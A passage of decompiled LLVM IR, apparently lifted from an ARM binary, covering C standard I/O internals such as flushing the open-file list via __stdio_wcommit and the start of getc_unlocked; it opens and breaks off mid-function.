  %v0_17c8c = phi i32 [ %v0_17c80, %dec_label_pc_17c80 ], [ %v2_17c60111, %dec_label_pc_17c54 ], [ %v2_17c60, %dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge ]
  %v1_17c84 = phi i32 [ %v0_17c80, %dec_label_pc_17c80 ], [ %v2_17c54, %dec_label_pc_17c54 ], [ %v1_17c64.pre, %dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge ]
  %v3_17c84 = icmp uge i32 %v0_17c8c, %v1_17c84
  store i1 %v3_17c84, i1* %cpsr_c.global-to-local, align 1
  %v9_17c84 = icmp eq i32 %v0_17c8c, %v1_17c84
  br i1 %v9_17c84, label %dec_label_pc_17c8c, label %dec_label_pc_17c84.dec_label_pc_17c54_crit_edge

dec_label_pc_17c84.dec_label_pc_17c54_crit_edge:  ; preds = %dec_label_pc_17c84
  %v0_17c54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17c54

dec_label_pc_17c8c:                               ; preds = %dec_label_pc_17c84
  %v2_17c8c = icmp ne i32 %v1_17c84, 0
  store i1 %v2_17c8c, i1* %cpsr_c.global-to-local, align 1
  %v7_17c90 = icmp slt i32 %v1_17c84, 2
  br i1 %v7_17c90, label %dec_label_pc_17cacthread-pre-split, label %dec_label_pc_17c94

dec_label_pc_17c94:                               ; preds = %dec_label_pc_17c8c
  %v0_17c94 = load i32, i32* @r7, align 4
  store i32 %v0_17c94, i32* %r0.global-to-local, align 4
  %v0_17c98 = load i32, i32* %r1.global-to-local, align 4
  %v1_17c98 = add i32 %v0_17c98, 129
  store i32 %v1_17c98, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17cacthread-pre-split

dec_label_pc_17cacthread-pre-split:               ; preds = %dec_label_pc_17c8c, %dec_label_pc_17c94
  %v0_17df8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_17cac

dec_label_pc_17cac:                               ; preds = %dec_label_pc_17cacthread-pre-split, %dec_label_pc_17c2c
  %v0_17df8.pr = phi i32 [ %v0_17df8.pr.pr, %dec_label_pc_17cacthread-pre-split ], [ %v2_17c44, %dec_label_pc_17c2c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17df818 = icmp eq i32 %v0_17df8.pr, 0
  br i1 %v2_17df818, label %dec_label_pc_17e00, label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17cac, %dec_label_pc_17df4
  %v0_17ce4 = phi i32 [ %v3_17df4, %dec_label_pc_17df4 ], [ %v0_17df8.pr, %dec_label_pc_17cac ]
  %v1_17cbc = inttoptr i32 %v0_17ce4 to i16*
  %v2_17cbc = load i16, i16* %v1_17cbc, align 2
  %v3_17cbc = zext i16 %v2_17cbc to i32
  store i32 %v3_17cbc, i32* %r3.global-to-local, align 4
  %v1_17cc0 = and i32 %v3_17cbc, 64
  %v2_17cc0 = icmp eq i32 %v1_17cc0, 0
  br i1 %v2_17cc0, label %dec_label_pc_17df4, label %dec_label_pc_17cc8

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17cbc
  %v0_17cc8 = load i32, i32* @r6, align 4
  %v1_17cc8 = load i32, i32* %sb.global-to-local, align 4
  %v2_17cc8 = add i32 %v1_17cc8, %v0_17cc8
  %v3_17cc8 = inttoptr i32 %v2_17cc8 to i32*
  %v4_17cc8 = load i32, i32* %v3_17cc8, align 4
  store i32 %v4_17cc8, i32* %r3.global-to-local, align 4
  %v1_17ccc = inttoptr i32 %v4_17cc8 to i32*
  %v2_17ccc = load i32, i32* %v1_17ccc, align 4
  store i32 %v2_17ccc, i32* %r3.global-to-local, align 4
  %v2_17cd0 = icmp ugt i32 %v2_17ccc, 1
  store i1 %v2_17cd0, i1* %cpsr_c.global-to-local, align 1
  %v7_17cd0 = icmp eq i32 %v2_17ccc, 2
  br i1 %v7_17cd0, label %dec_label_pc_17d34, label %dec_label_pc_17cd8

dec_label_pc_17cd8:                               ; preds = %dec_label_pc_17cc8
  %v1_17cd8 = add i32 %v0_17ce4, 64
  %v2_17cd8 = inttoptr i32 %v1_17cd8 to i32*
  %v3_17cd8 = load i32, i32* %v2_17cd8, align 4
  store i32 %v3_17cd8, i32* %r3.global-to-local, align 4
  %v1_17cdc = load i32, i32* %r8.global-to-local, align 4
  %v3_17cdc = icmp uge i32 %v3_17cd8, %v1_17cdc
  store i1 %v3_17cdc, i1* %cpsr_c.global-to-local, align 1
  %v9_17cdc = icmp eq i32 %v3_17cd8, %v1_17cdc
  br i1 %v9_17cdc, label %dec_label_pc_17d28, label %dec_label_pc_17ce4

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17cd8
  %v1_17ce4 = add i32 %v0_17ce4, 56
  store i32 %v1_17ce4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17ce4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17cf486 = inttoptr i32 %v1_17ce4 to i32*
  %v2_17cf487 = load i32, i32* %v1_17cf486, align 4
  store i32 %v2_17cf487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17cf894 = icmp eq i32 %v2_17cf487, 0
  br i1 %v9_17cf894, label %dec_label_pc_17d00, label %dec_label_pc_17d18

dec_label_pc_17d00:                               ; preds = %dec_label_pc_17ce4, %dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge
  %v0_17d0095 = phi i32 [ %v1_17cf8.pre, %dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge ], [ 0, %dec_label_pc_17ce4 ]
  store i32 %v0_17d0095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17d10 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17d10, label %dec_label_pc_17d14, label %dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge

dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge:  ; preds = %dec_label_pc_17d00
  %v0_17cf4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17cf8.pre = load i32, i32* @r4, align 4
  %v1_17cf4 = inttoptr i32 %v0_17cf4.pre to i32*
  %v2_17cf4 = load i32, i32* %v1_17cf4, align 4
  store i32 %v2_17cf4, i32* %r3.global-to-local, align 4
  %v3_17cf8 = icmp uge i32 %v2_17cf4, %v1_17cf8.pre
  store i1 %v3_17cf8, i1* %cpsr_c.global-to-local, align 1
  %v9_17cf8 = icmp eq i32 %v2_17cf4, %v1_17cf8.pre
  br i1 %v9_17cf8, label %dec_label_pc_17d00, label %dec_label_pc_17d18

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17d00
  %v0_17d14 = load i32, i32* @r4, align 4
  store i32 %v0_17d14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d18

dec_label_pc_17d18:                               ; preds = %dec_label_pc_17ce4, %dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge, %dec_label_pc_17d14
  %v0_17d18 = phi i32 [ %v0_17d14, %dec_label_pc_17d14 ], [ %v2_17cf487, %dec_label_pc_17ce4 ], [ %v2_17cf4, %dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge ]
  %v1_17d18 = phi i32 [ %v0_17d14, %dec_label_pc_17d14 ], [ 0, %dec_label_pc_17ce4 ], [ %v1_17cf8.pre, %dec_label_pc_17d00.dec_label_pc_17cf4_crit_edge ]
  %v3_17d18 = icmp uge i32 %v0_17d18, %v1_17d18
  store i1 %v3_17d18, i1* %cpsr_c.global-to-local, align 1
  %v9_17d18 = icmp eq i32 %v0_17d18, %v1_17d18
  br i1 %v9_17d18, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17d18
  %v1_17d1c = load i32, i32* @r7, align 4
  store i32 %v1_17d1c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17d18, %bb69
  %v1_17d20 = xor i1 %v9_17d18, true
  call void @__pseudo_cond_branch(i1 %v1_17d20, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_17d24 = load i32, i32* %r8.global-to-local, align 4
  %v1_17d24 = load i32, i32* @r5, align 4
  %v2_17d24 = add i32 %v1_17d24, 64
  %v3_17d24 = inttoptr i32 %v2_17d24 to i32*
  store i32 %v0_17d24, i32* %v3_17d24, align 4
  %v0_17d28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d28

dec_label_pc_17d28:                               ; preds = %dec_label_pc_17cd8, %bb70
  %v0_17d28 = phi i32 [ %v0_17ce4, %dec_label_pc_17cd8 ], [ %v0_17d28.pre, %bb70 ]
  %v1_17d28 = add i32 %v0_17d28, 60
  %v2_17d28 = inttoptr i32 %v1_17d28 to i32*
  %v3_17d28 = load i32, i32* %v2_17d28, align 4
  %v1_17d2c = add i32 %v3_17d28, 1
  store i32 %v1_17d2c, i32* %r3.global-to-local, align 4
  store i32 %v1_17d2c, i32* %v2_17d28, align 4
  %v0_17d34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d34

dec_label_pc_17d34:                               ; preds = %dec_label_pc_17cc8, %dec_label_pc_17d28
  %v0_17d4c = phi i32 [ %v0_17ce4, %dec_label_pc_17cc8 ], [ %v0_17d34.pre, %dec_label_pc_17d28 ]
  %v1_17d34 = inttoptr i32 %v0_17d4c to i16*
  %v2_17d34 = load i16, i16* %v1_17d34, align 2
  %v3_17d34 = zext i16 %v2_17d34 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_17d3c = or i32 %v3_17d34, %stack_var_-44.1
  %v1_17d40 = xor i32 %v2_17d3c, 320
  store i32 %v1_17d40, i32* %r3.global-to-local, align 4
  %v1_17d44 = and i32 %v1_17d40, 832
  %v2_17d44 = icmp eq i32 %v1_17d44, 0
  br i1 %v2_17d44, label %dec_label_pc_17d4c, label %bb71

dec_label_pc_17d4c:                               ; preds = %dec_label_pc_17d34
  store i32 %v0_17d4c, i32* %r0.global-to-local, align 4
  %v1_17d50 = call i32 @__stdio_wcommit(i32 %v0_17d4c)
  store i32 %v1_17d50, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d54 = icmp eq i32 %v1_17d50, 0
  br i1 %v2_17d54, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_17d4c
  %v1_17d58 = load i32, i32* @r5, align 4
  %v2_17d58 = inttoptr i32 %v1_17d58 to i16*
  %v3_17d58 = load i16, i16* %v2_17d58, align 2
  %v4_17d58 = zext i16 %v3_17d58 to i32
  store i32 %v4_17d58, i32* %r3.global-to-local, align 4
  %v2_17d5c = add i32 %v1_17d58, 8
  %v3_17d5c = inttoptr i32 %v2_17d5c to i32*
  %v4_17d5c = load i32, i32* %v3_17d5c, align 4
  store i32 %v4_17d5c, i32* %r2.global-to-local, align 4
  %v2_17d60 = and i32 %v4_17d58, 65471
  store i32 %v2_17d60, i32* %r3.global-to-local, align 4
  %v3_17d64 = add i32 %v1_17d58, 28
  %v4_17d64 = inttoptr i32 %v3_17d64 to i32*
  store i32 %v4_17d5c, i32* %v4_17d64, align 4
  %v1_17d68 = load i32, i32* %r3.global-to-local, align 4
  %v2_17d68 = trunc i32 %v1_17d68 to i16
  %v3_17d68 = load i32, i32* @r5, align 4
  %v4_17d68 = inttoptr i32 %v3_17d68 to i16*
  store i16 %v2_17d68, i16* %v4_17d68, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_17d4c
  %v1_17d6c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_17d6c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_17d34, %.thread7
  %v0_17d70 = load i32, i32* @r6, align 4
  %v1_17d70 = load i32, i32* %sb.global-to-local, align 4
  %v2_17d70 = add i32 %v1_17d70, %v0_17d70
  %v3_17d70 = inttoptr i32 %v2_17d70 to i32*
  %v4_17d70 = load i32, i32* %v3_17d70, align 4
  store i32 %v4_17d70, i32* %r3.global-to-local, align 4
  %v1_17d74 = inttoptr i32 %v4_17d70 to i32*
  %v2_17d74 = load i32, i32* %v1_17d74, align 4
  store i32 %v2_17d74, i32* %r3.global-to-local, align 4
  %v2_17d78 = icmp ugt i32 %v2_17d74, 1
  store i1 %v2_17d78, i1* %cpsr_c.global-to-local, align 1
  %v7_17d78 = icmp eq i32 %v2_17d74, 2
  br i1 %v7_17d78, label %dec_label_pc_17df4, label %dec_label_pc_17d80

dec_label_pc_17d80:                               ; preds = %bb71
  %v0_17d80 = load i32, i32* @r5, align 4
  %v1_17d80 = add i32 %v0_17d80, 60
  %v2_17d80 = inttoptr i32 %v1_17d80 to i32*
  %v3_17d80 = load i32, i32* %v2_17d80, align 4
  %v1_17d84 = add i32 %v3_17d80, -1
  store i32 %v1_17d84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d88 = icmp eq i32 %v1_17d84, 0
  store i32 %v1_17d84, i32* %v2_17d80, align 4
  br i1 %v2_17d88, label %dec_label_pc_17d94, label %dec_label_pc_17df4

dec_label_pc_17d94:                               ; preds = %dec_label_pc_17d80
  %v0_17d94 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d94 = load i32, i32* @r5, align 4
  %v2_17d94 = add i32 %v1_17d94, 64
  %v3_17d94 = inttoptr i32 %v2_17d94 to i32*
  store i32 %v0_17d94, i32* %v3_17d94, align 4
  %v0_17d98 = load i32, i32* @r5, align 4
  %v1_17d98 = add i32 %v0_17d98, 56
  store i32 %v1_17d98, i32* @r7, align 4
  br label %dec_label_pc_17d9c

dec_label_pc_17d9c:                               ; preds = %dec_label_pc_17dcc.dec_label_pc_17d9c_crit_edge, %dec_label_pc_17d94
  %v0_17da4 = phi i32 [ %v0_17da4.pre, %dec_label_pc_17dcc.dec_label_pc_17d9c_crit_edge ], [ %v1_17d98, %dec_label_pc_17d94 ]
  %v0_17d9c = phi i32 [ %v0_17d9c.pre, %dec_label_pc_17dcc.dec_label_pc_17d9c_crit_edge ], [ %v0_17d98, %dec_label_pc_17d94 ]
  %v1_17d9c = add i32 %v0_17d9c, 56
  %v2_17d9c = inttoptr i32 %v1_17d9c to i32*
  %v3_17d9c = load i32, i32* %v2_17d9c, align 4
  store i32 %v3_17d9c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17da4, i32* %r2.global-to-local, align 4
  %v1_17da897 = inttoptr i32 %v0_17da4 to i32*
  %v2_17da898 = load i32, i32* %v1_17da897, align 4
  store i32 %v2_17da898, i32* %r3.global-to-local, align 4
  %v3_17dac100 = icmp uge i32 %v2_17da898, %v3_17d9c
  store i1 %v3_17dac100, i1* %cpsr_c.global-to-local, align 1
  %v9_17dac106 = icmp eq i32 %v2_17da898, %v3_17d9c
  br i1 %v9_17dac106, label %dec_label_pc_17db4, label %dec_label_pc_17dcc

dec_label_pc_17db4:                               ; preds = %dec_label_pc_17d9c, %dec_label_pc_17db4.dec_label_pc_17da8_crit_edge
  %v0_17db4107 = phi i32 [ %v1_17dac.pre, %dec_label_pc_17db4.dec_label_pc_17da8_crit_edge ], [ %v3_17d9c, %dec_label_pc_17d9c ]
  store i32 %v0_17db4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17dc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17dc4, label %dec_label_pc_17dc8, label %dec_label_pc_17db4.dec_label_pc_17da8_crit_edge

dec_label_pc_17db4.dec_label_pc_17da8_crit_edge:  ; preds = %dec_label_pc_17db4
  %v0_17da8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17dac.pre = load i32, i32* @r4, align 4
  %v1_17da8 = inttoptr i32 %v0_17da8.pre to i32*
  %v2_17da8 = load i32, i32* %v1_17da8, align 4
  store i32 %v2_17da8, i32* %r3.global-to-local, align 4
  %v3_17dac = icmp uge i32 %v2_17da8, %v1_17dac.pre
  store i1 %v3_17dac, i1* %cpsr_c.global-to-local, align 1
  %v9_17dac = icmp eq i32 %v2_17da8, %v1_17dac.pre
  br i1 %v9_17dac, label %dec_label_pc_17db4, label %dec_label_pc_17dcc

dec_label_pc_17dc8:                               ; preds = %dec_label_pc_17db4
  %v0_17dc8 = load i32, i32* @r4, align 4
  store i32 %v0_17dc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17dcc

dec_label_pc_17dcc:                               ; preds = %dec_label_pc_17d9c, %dec_label_pc_17db4.dec_label_pc_17da8_crit_edge, %dec_label_pc_17dc8
  %v0_17dd4 = phi i32 [ %v0_17dc8, %dec_label_pc_17dc8 ], [ %v2_17da898, %dec_label_pc_17d9c ], [ %v2_17da8, %dec_label_pc_17db4.dec_label_pc_17da8_crit_edge ]
  %v1_17dcc = phi i32 [ %v0_17dc8, %dec_label_pc_17dc8 ], [ %v3_17d9c, %dec_label_pc_17d9c ], [ %v1_17dac.pre, %dec_label_pc_17db4.dec_label_pc_17da8_crit_edge ]
  %v3_17dcc = icmp uge i32 %v0_17dd4, %v1_17dcc
  store i1 %v3_17dcc, i1* %cpsr_c.global-to-local, align 1
  %v9_17dcc = icmp eq i32 %v0_17dd4, %v1_17dcc
  br i1 %v9_17dcc, label %dec_label_pc_17dd4, label %dec_label_pc_17dcc.dec_label_pc_17d9c_crit_edge

dec_label_pc_17dcc.dec_label_pc_17d9c_crit_edge:  ; preds = %dec_label_pc_17dcc
  %v0_17d9c.pre = load i32, i32* @r5, align 4
  %v0_17da4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17d9c

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17dcc
  %v2_17dd4 = icmp ne i32 %v1_17dcc, 0
  store i1 %v2_17dd4, i1* %cpsr_c.global-to-local, align 1
  %v7_17dd8 = icmp slt i32 %v1_17dcc, 2
  br i1 %v7_17dd8, label %dec_label_pc_17df4, label %dec_label_pc_17ddc

dec_label_pc_17ddc:                               ; preds = %dec_label_pc_17dd4
  %v0_17ddc = load i32, i32* @r5, align 4
  %v1_17ddc = add i32 %v0_17ddc, 56
  store i32 %v1_17ddc, i32* %r0.global-to-local, align 4
  %v0_17de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17de0 = add i32 %v0_17de0, 129
  store i32 %v1_17de0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17df4

dec_label_pc_17df4:                               ; preds = %dec_label_pc_17d80, %dec_label_pc_17ddc, %dec_label_pc_17dd4, %bb71, %dec_label_pc_17cbc
  %v0_17df4 = load i32, i32* @r5, align 4
  %v1_17df4 = add i32 %v0_17df4, 32
  %v2_17df4 = inttoptr i32 %v1_17df4 to i32*
  %v3_17df4 = load i32, i32* %v2_17df4, align 4
  store i32 %v3_17df4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17df8 = icmp eq i32 %v3_17df4, 0
  br i1 %v2_17df8, label %dec_label_pc_17e00, label %dec_label_pc_17cbc

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17df4, %dec_label_pc_17cac
  %v0_17e00 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17e00, i32* %r0.global-to-local, align 4
  %v0_17e3c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17ae4
  %v3_17e08 = load i16, i16* %arg1, align 2
  %v4_17e08 = zext i16 %v3_17e08 to i32
  %v1_17e0c = and i32 %v4_17e08, 64
  store i32 %v1_17e0c, i32* %r3.global-to-local, align 4
  %v2_17e0c = icmp eq i32 %v1_17e0c, 0
  br i1 %v2_17e0c, label %bb72, label %dec_label_pc_17e18

bb72:                                             ; preds = %dec_label_pc_17e08
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17e18:                               ; preds = %dec_label_pc_17e08
  %v2_17e18 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17e18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e1c = icmp eq i32 %v2_17e18, 0
  br i1 %v2_17e1c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17e18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17e18
  %v1_17e20 = load i32, i32* @r4, align 4
  %v2_17e20 = inttoptr i32 %v1_17e20 to i16*
  %v3_17e20 = load i16, i16* %v2_17e20, align 2
  %v4_17e20 = zext i16 %v3_17e20 to i32
  store i32 %v4_17e20, i32* %r3.global-to-local, align 4
  %v2_17e24 = add i32 %v1_17e20, 8
  %v3_17e24 = inttoptr i32 %v2_17e24 to i32*
  %v4_17e24 = load i32, i32* %v3_17e24, align 4
  store i32 %v4_17e24, i32* %r2.global-to-local, align 4
  %v2_17e28 = and i32 %v4_17e20, 65471
  store i32 %v2_17e28, i32* %r3.global-to-local, align 4
  %v2_17e2c = trunc i32 %v2_17e28 to i16
  store i16 %v2_17e2c, i16* %v2_17e20, align 2
  %v1_17e30 = load i32, i32* %r2.global-to-local, align 4
  %v2_17e30 = load i32, i32* @r4, align 4
  %v3_17e30 = add i32 %v2_17e30, 28
  %v4_17e30 = inttoptr i32 %v3_17e30 to i32*
  store i32 %v1_17e30, i32* %v4_17e30, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17e00, %.thread14
  %v0_17e3c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_17e3c.pre, %dec_label_pc_17e00 ], [ 0, %.thread14 ]
  store i32 %v0_17e3c, i32* %r0.global-to-local, align 4
  store i32 %v6_17ab8, i32* %r5.global-to-local, align 4
  ret i32 %v0_17e3c

; uselistorder directives
  uselistorder i32 %v0_17e3c, { 1, 0 }
  uselistorder i32 %v3_17df4, { 1, 2, 0 }
  uselistorder i32 %v0_17dc8, { 1, 0, 2 }
  uselistorder i32 %v1_17dac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17d4c, { 1, 0, 2 }
  uselistorder i32 %v0_17d14, { 1, 0, 2 }
  uselistorder i32 %v1_17cf8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17cdc, { 1, 0 }
  uselistorder i32 %v0_17c80, { 1, 0, 2 }
  uselistorder i32 %v1_17c64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17c54, { 1, 0 }
  uselistorder i32 %v0_17c18, { 1, 0, 2 }
  uselistorder i32 %v1_17bfc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17be4, { 1, 0 }
  uselistorder i32 %v0_17bac, { 1, 0, 2 }
  uselistorder i32 %v1_17b90.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17b80, { 1, 0 }
  uselistorder i32 %v0_17b3c, { 1, 0, 2 }
  uselistorder i32 %v1_17b20.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17af8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 54, 33, 34, 35, 36, 38, 37, 53, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 37, 38, 18, 19, 20, 21, 35, 36, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17df4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_17dcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17db4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d34, { 1, 0 }
  uselistorder label %dec_label_pc_17d28, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17d18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d00, { 1, 0 }
  uselistorder label %dec_label_pc_17cbc, { 1, 0 }
  uselistorder label %dec_label_pc_17cacthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_17c84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c6c, { 1, 0 }
  uselistorder label %dec_label_pc_17c2c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_17c1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c04, { 1, 0 }
  uselistorder label %dec_label_pc_17bd8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17bb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b98, { 1, 0 }
  uselistorder label %dec_label_pc_17b50, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_17b40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b28, { 1, 0 }
  uselistorder label %dec_label_pc_17af4, { 1, 0 }
}

define i32 @function_17e50(i32 %arg1) local_unnamed_addr {
dec_label_pc_17e50:
  %v0_17e50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17e50, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17e50
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17e50, %bb
  %v10_17e60 = phi i32 [ %arg1, %dec_label_pc_17e50 ], [ 0, %bb ]
  ret i32 %v10_17e60

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_17e64 = load i32, i32* @r4, align 4
  store i32 %v3_17e64, i32* %stack_var_-12, align 4
  %v6_17e64 = load i32, i32* @r5, align 4
  %v9_17e64 = load i32, i32* @lr, align 4
  %v0_17e68 = load i32, i32* @r0, align 4
  %v1_17e68 = add i32 %v0_17e68, 16
  %v2_17e68 = inttoptr i32 %v1_17e68 to i32*
  %v3_17e68 = load i32, i32* %v2_17e68, align 4
  store i32 %v3_17e68, i32* %r2.global-to-local, align 4
  %v1_17e6c = add i32 %v0_17e68, 24
  %v2_17e6c = inttoptr i32 %v1_17e6c to i32*
  %v3_17e6c = load i32, i32* %v2_17e6c, align 4
  %v3_17e70 = icmp ult i32 %v3_17e68, %v3_17e6c
  store i32 %v0_17e68, i32* @r4, align 4
  br i1 %v3_17e70, label %bb, label %dec_label_pc_17e90

bb:                                               ; preds = %entry
  %v2_17e7c = inttoptr i32 %v3_17e68 to i8*
  %v3_17e7c = load i8, i8* %v2_17e7c, align 1
  %v4_17e7c = zext i8 %v3_17e7c to i32
  store i32 %v4_17e7c, i32* %r0.global-to-local, align 4
  %v6_17e7c = add i32 %v3_17e68, 1
  store i32 %v6_17e7c, i32* %r2.global-to-local, align 4
  store i32 %v6_17e7c, i32* %v2_17e68, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17e90:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r5, align 4
  %v1_17e90 = inttoptr i32 %v0_17e68 to i16*
  %v2_17e90 = load i16, i16* %v1_17e90, align 2
  %v3_17e90 = zext i16 %v2_17e90 to i32
  %v1_17e94 = and i32 %v3_17e90, 131
  %tmp25 = icmp ugt i32 %v1_17e94, 128
  br i1 %tmp25, label %dec_label_pc_17eb0, label %dec_label_pc_17ea0

